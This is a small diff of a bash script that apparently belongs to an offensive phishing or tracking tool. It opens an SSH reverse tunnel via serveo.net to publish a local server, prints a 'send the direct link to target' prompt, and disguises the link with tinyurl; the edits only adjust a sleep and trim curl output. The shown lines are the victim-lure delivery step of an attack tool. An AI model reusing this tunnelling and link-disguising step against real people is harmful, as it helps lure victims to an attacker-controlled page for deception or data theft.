@@ -329,11 +329,11 @@ rm -rf sendlink
 fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
-sleep 6 # &
+sleep 10 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 checkfound
